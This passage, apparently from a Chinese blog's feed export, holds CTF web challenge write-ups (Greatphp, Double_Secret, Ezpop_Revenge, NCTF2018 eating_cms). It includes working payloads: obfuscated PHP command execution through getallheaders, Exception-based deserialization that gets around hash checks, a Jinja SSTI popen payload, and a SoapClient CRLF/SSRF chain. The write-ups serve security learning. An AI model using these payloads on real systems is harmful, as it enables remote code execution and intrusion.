<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//system %8C%86%8C%8B%9A%92</span></span><br><span class="line"><span class="comment">//session_id %8C%9A%8C%8C%96%90%91%A0%96%9B</span></span><br><span class="line"><span class="comment">//session_start %8C%9A%8C%8C%96%90%91%A0%8C%8B%9E%8D%8B</span></span><br><span class="line"><span class="comment">// %9A%89%9E%93</span></span><br><span class="line"><span class="comment">//拼出来 [~%9A%89%9E%93][!%FF]([~%8C%9A%8C%8C%96%90%91%A0%96%9B][!%FF]([~%8C%9A%8C%8C%96%90%91%A0%8C%8B%9E%8D%8B][!%FF]()));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// system(pos(getallheaders()))</span></span><br><span class="line"><span class="comment">//var_dump %89%9E%8D%A0%9B%8A%92%8F</span></span><br><span class="line"><span class="comment">//system %8C%86%8C%8B%9A%92</span></span><br><span class="line"><span class="comment">//pos %8F%90%8C</span></span><br><span class="line"><span class="comment">//getallheaders %98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C</span></span><br><span class="line"><span class="comment">//拼出来 [~%8C%86%8C%8B%9A%92][!%FF]([~%8F%90%8C][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));</span></span><br><span class="line"><span class="comment">//var_dump(pos(getallheaders()))</span></span><br><span class="line"><span class="comment">//[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%8F%90%8C][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));</span></span><br></pre></td></tr></table></figure>

<p>发现首位不可以用，我们再next一下</p>
<p>最后拼接出来</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">system(next(getallheaders()));</span><br></pre></td></tr></table></figure>

<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">cmd=[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));&amp;code=351355</span><br></pre></td></tr></table></figure>





<h2 id="Greatphp"><a href="#Greatphp" class="headerlink" title="Greatphp"></a>Greatphp</h2><p>早就做过这种类似的题目了</p>
<p><a href="https://guokeya.github.io/post/fAqKypsaK/">https://guokeya.github.io/post/fAqKypsaK/</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WTF</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var3;</span><br><span class="line">&#125;</span><br><span class="line">$ex1 = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;phpinfo();?&gt;&#x27;</span>);$ex2 = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;phpinfo();?&gt;&#x27;</span>,<span class="number">2</span>); <span class="comment">//必须在同一行</span></span><br><span class="line">$wtf = <span class="keyword">new</span> WTF();</span><br><span class="line">$wtf-&gt;var1 = $ex1;</span><br><span class="line">$wtf-&gt;var2 = $ex2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($wtf));</span><br></pre></td></tr></table></figure>



<p>这里加了一些过滤，不准用括号和php字样等等，我们就，一开始我是想</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span>`ls`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果还是不行的样子，疑似是被过滤了shell_exec，那只能用</p>
<p>require和include加上取反的字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">著作权归作者所有。</span><br><span class="line">商业转载请联系作者获得授权，非商业转载请注明出处。</span><br><span class="line">Troy3e</span><br><span class="line">链接：https:<span class="comment">//troyess.com/2021/03/29/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</span></span><br><span class="line">来源：YukinoTroy3e</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $syc;</span><br><span class="line">    <span class="keyword">public</span> $lover;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">$this</span>-&gt;syc != <span class="keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="keyword">$this</span>-&gt;syc) === md5(<span class="keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="keyword">$this</span>-&gt;syc) === sha1(<span class="keyword">$this</span>-&gt;lover))) &#123;</span><br><span class="line">           <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="keyword">$this</span>-&gt;var1, $match)) &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;syc);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$str = <span class="string">&quot;?&gt;&quot;</span>.<span class="string">&quot;&lt;?=include~&quot;</span>.urldecode(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">Exception</span>($str, <span class="number">1</span>);$b = <span class="keyword">new</span> <span class="built_in">Exception</span>($str, <span class="number">2</span>);</span><br><span class="line">$c = <span class="keyword">new</span> SYCLOVER();</span><br><span class="line">$c-&gt;syc = $a;</span><br><span class="line">$c-&gt;lover = $b;</span><br><span class="line"><span class="keyword">echo</span>(urlencode(serialize($c)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>Double_Secret</title>
    <url>/2021/04/22/Double-Secret/</url>
    <content><![CDATA[<h1 id="Double-Secret"><a href="#Double-Secret" class="headerlink" title="Double_Secret"></a>Double_Secret</h1><p>无语，脑洞题目，需要几下的就是rc4的加密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><span class="comment">#返回加密后得内容</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>)) </span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;HereIsTreasure&quot;</span>  <span class="comment">#此处为密文</span></span><br><span class="line">message = <span class="built_in">input</span>(<span class="string">&quot;请输入明文:\n&quot;</span>)</span><br><span class="line">enc_base64 = rc4_main( key , message )</span><br><span class="line">enc_init = <span class="built_in">str</span>(base64.b64decode(enc_base64),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">enc_url = parse.quote(enc_init)</span><br><span class="line">print(<span class="string">&quot;rc4加密后的url编码:&quot;</span>+enc_url)</span><br><span class="line"><span class="comment">#print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span></span><br><span class="line"></span><br><span class="line">放出：</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>Ezpop_Revenge</title>
    <url>/2021/05/02/Ezpop-Revenge/</url>
    <content><![CDATA[<p>原本以为是挖day的题目，没想到出奇的比较简单..</p>
<h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><h2 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h2><p>这题目需要利用到原生类SoapClient 进行反序列化，并且到该类调用call方法的时候，就会自动去访问指定的url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.btis.site&#x2F;2020&#x2F;07&#x2F;13&#x2F;SoapClient%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&#x2F;#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%9A</span><br></pre></td></tr></table></figure>



<p>该类无法携带自己的cookies，但是我们通过CRLF便可以成功的控制了，给出的payload如下：</p>
<p>利用代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">$attack = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;btis\r\nCookie: PHPSESSID=ctrmmddufre6nph5908ajosbo7\r\n&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;123&quot;</span>));</span><br><span class="line">$payload = urlencode(serialize($attack));</span><br><span class="line"><span class="keyword">echo</span> $payload;</span><br></pre></td></tr></table></figure>



<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>先找能够输入的地方，全局搜索unserialize,在Plugin中找到..</p>
<p>再之后发现出题人自定义的写了一个类，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;hello&#x27;</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;world&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>肯定有用，跟过去看看Tyecho_Db类。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$adapterName, $prefix = <span class="string">&#x27;typecho_&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">        $adapterName = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . $adapterName;</span><br><span class="line"><span class="comment">#<span class="doctag">TODO:</span> 给出提示</span></span><br><span class="line">        <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">&#x27;isAvailable&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">&quot;Adapter <span class="subst">&#123;$adapterName&#125;</span> is not available&quot;</span>);<span class="comment">//__toString()</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>发现让我们找一个__toString，全局搜索</p>
<p><img src="Ezpop_Revenge/image-20210502165414404.png" alt="image-20210502165414404"></p>
<p>挨个找，Feed的没啥用，没有能够调用call的地方，config的更没用了，，看到Query.php里面的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">          <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">              <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">          <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">              <span class="keyword">return</span> <span class="string">&#x27;INSERT INTO &#x27;</span></span><br><span class="line">              . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>这里看看adapter是否可控，跟转之后就会发现该属性完全可控，那么接着控制_adapter 位soapClient类即可。</p>
<p>拼凑payload：</p>
<p>ssrf的代码借鉴了y1ng师傅的。。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;hello&#x27;</span>] = <span class="keyword">new</span> Typecho_Db_Query();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;hello&#x27;</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;world&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $target = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">        $post_string = <span class="string">&#x27;admin=&amp;ip=111.111.111.111&amp;port=1111&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=&#x27;</span>. <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">        $headers = [</span><br><span class="line">            <span class="string">&#x27;X-Forwarded-For:127.0.0.1&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;Cookie: PHPSESSID=s8fo8ma30gbttqvgdbb48k6rm4&quot;</span></span><br><span class="line">        ];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;aaab&#x27;</span>, <span class="string">&#x27;location&#x27;</span> =&gt; $target, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&#x27;Y1ng^^&#x27;</span> . join(<span class="string">&#x27;^^&#x27;</span>, $headers)));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]= <span class="string">&#x27;SELECT&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decorate</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $arr = explode(<span class="string">&#x27;:&#x27;</span>, $str);</span><br><span class="line">    $newstr = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($arr); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/00/&#x27;</span>, $arr[$i])) &#123;</span><br><span class="line">            $arr[$i - <span class="number">2</span>] = preg_replace(<span class="string">&#x27;/s/&#x27;</span>, <span class="string">&quot;S&quot;</span>, $arr[$i - <span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; $i &lt; count($arr) - <span class="number">1</span>; $i++) &#123;</span><br><span class="line">        $newstr .= $arr[$i];</span><br><span class="line">        $newstr .= <span class="string">&quot;:&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $newstr .= $arr[$i];</span><br><span class="line">    <span class="keyword">return</span> $newstr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$y1ng = serialize(<span class="keyword">new</span> HelloWorld_DB());</span><br><span class="line">$y1ng = preg_replace(<span class="string">&quot; /\^\^/&quot;</span>, <span class="string">&quot;\r\n&quot;</span>, $y1ng);</span><br><span class="line">$urlen = urlencode($y1ng);</span><br><span class="line">$urlen = preg_replace(<span class="string">&#x27;/%00/&#x27;</span>, <span class="string">&#x27;%5c%30%30&#x27;</span>, $urlen);</span><br><span class="line">$y1ng = decorate(urldecode($urlen));</span><br><span class="line"><span class="keyword">echo</span> base64_encode($y1ng);</span><br></pre></td></tr></table></figure>



<p>根据flag.php，最终结果被打印到了$session里面所以我们要穿自己的sesion过去</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">   $_SESSION[<span class="string">&#x27;flag&#x27;</span>]= <span class="string">&quot;MRCTF&#123;******&#125;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;我扌your problem?\nonly localhost can get flag!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>反序列化</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>NCTF2018_eating_cms</title>
    <url>/2021/04/26/NCTF2018-eating-cms/</url>
    <content><![CDATA[<h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><p>这题学到的东西是：</p>
<p>当命令执行../被过滤的时候可以用cd ..;ls ..的方式逐步向上操作。</p>
<h1 id="做题思路："><a href="#做题思路：" class="headerlink" title="做题思路："></a>做题思路：</h1><p>开局有个login,登陆的时候</p>
<p><img src="NCTF2018_eating_cms/image-20210426212241594.png" alt="image-20210426212241594"></p>
<p>所以猜测他有注册页面，注册一下就进去了，进去之后就发现：</p>
<p><img src="NCTF2018_eating_cms/image-20210426213501783.png" alt="image-20210426213501783"></p>
<p>尝试用伪协议读取文件，找到function.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Hacker</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Header(<span class="string">&quot;Location: hacker.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $keywords = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;manage&quot;</span>,<span class="string">&quot;ffffllllaaaaggg&quot;</span>];</span><br><span class="line">    $uri = parse_url($_SERVER[<span class="string">&quot;REQUEST_URI&quot;</span>]);</span><br><span class="line">    parse_str($uri[<span class="string">&#x27;query&#x27;</span>], $query);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>($keywords <span class="keyword">as</span> $token)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($query <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (stristr($k, $token))</span><br><span class="line">                hacker();</span><br><span class="line">            <span class="keyword">if</span> (stristr($v, $token))</span><br><span class="line">                hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory_guest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $keywords = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;manage&quot;</span>,<span class="string">&quot;ffffllllaaaaggg&quot;</span>,<span class="string">&quot;info&quot;</span>];</span><br><span class="line">    $uri = parse_url($_SERVER[<span class="string">&quot;REQUEST_URI&quot;</span>]);</span><br><span class="line">    parse_str($uri[<span class="string">&#x27;query&#x27;</span>], $query);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>($keywords <span class="keyword">as</span> $token)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($query <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (stristr($k, $token))</span><br><span class="line">                hacker();</span><br><span class="line">            <span class="keyword">if</span> (stristr($v, $token))</span><br><span class="line">                hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Filter</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $blacklist = <span class="string">&quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;</span>;</span><br><span class="line">    $whitelist = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($string); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="string">&quot;<span class="subst">$whitelist</span>&quot;</span>, $string[$i]) === <span class="literal">false</span>) &#123;</span><br><span class="line">            Hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/<span class="subst">$blacklist</span>/is&quot;</span>, $string)) &#123;</span><br><span class="line">        Hacker();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_string($string)) &#123;</span><br><span class="line">        <span class="keyword">return</span> $mysqli-&gt;real_escape_string($string);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_query</span>(<span class="params">$sql_query</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $res = $mysqli-&gt;query($sql_query);</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$user, $pass</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $user = Filter($user);</span><br><span class="line">    $pass = md5($pass);</span><br><span class="line">    $sql = <span class="string">&quot;select * from `albert_users` where `username_which_you_do_not_know`= &#x27;<span class="subst">$user</span>&#x27; and `password_which_you_do_not_know_too` = &#x27;<span class="subst">$pass</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> $sql;</span><br><span class="line">    $res = sql_query($sql);</span><br><span class="line"><span class="comment">//    var_dump($res);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        $data = $res-&gt;fetch_array();</span><br><span class="line">        $_SESSION[<span class="string">&#x27;user&#x27;</span>] = $data[username_which_you_do_not_know];</span><br><span class="line">        $_SESSION[<span class="string">&#x27;login&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;isadmin&#x27;</span>] = $data[isadmin_which_you_do_not_know_too_too];</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateadmin</span>(<span class="params">$level,$user</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $sql = <span class="string">&quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;<span class="subst">$level</span>&#x27; where `username_which_you_do_not_know`=&#x27;<span class="subst">$user</span>&#x27; &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> $sql;</span><br><span class="line">    $res = sql_query($sql);</span><br><span class="line"><span class="comment">//    var_dump($res);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//    die($res);</span></span><br><span class="line">    <span class="keyword">if</span> ($res == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params">$user, $pass</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $user = Filter($user);</span><br><span class="line">    $pass = md5($pass);</span><br><span class="line">    $sql = <span class="string">&quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#x27;<span class="subst">$user</span>&#x27;,&#x27;<span class="subst">$pass</span>&#x27;,&#x27;0&#x27;)&quot;</span>;</span><br><span class="line">    $res 